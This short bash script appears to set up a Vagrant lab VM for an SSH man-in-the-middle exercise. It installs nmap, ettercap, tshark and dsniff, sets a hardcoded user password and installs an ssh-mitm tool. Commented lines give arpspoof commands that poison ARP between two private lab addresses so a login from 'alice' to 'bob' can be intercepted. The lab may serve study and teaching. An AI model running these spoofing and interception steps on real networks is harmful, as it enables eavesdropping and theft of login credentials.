#!/bin/bash

sudo apt-get update
DEBIAN_FRONTEND=noninteractive sudo apt-get install -y libssl-dev \
    python3-netaddr \
    python3-netifaces \
    nmap \
    ettercap-text-only \
    tshark \
    dsniff \
    python3-netaddr \
    python3-netifaces
echo 'ubuntu:vagrant1' | sudo chpasswd
cp -ar /vagrant/ssh-mitm ~/
cd ~/ssh-mitm && sudo ./install.sh

# already root

# sudo ./JoesAwesomeSSHMITMVictimFinder.py --interface enp0s8
# sudo ./run.sh
# new window: arpspoof -r -t 172.28.x.1 172.28.x.5 
#arpspoof -i enp0s8 -r -t 172.28.128.20 172.28.128.30

# from alice log into bob -- good day sir
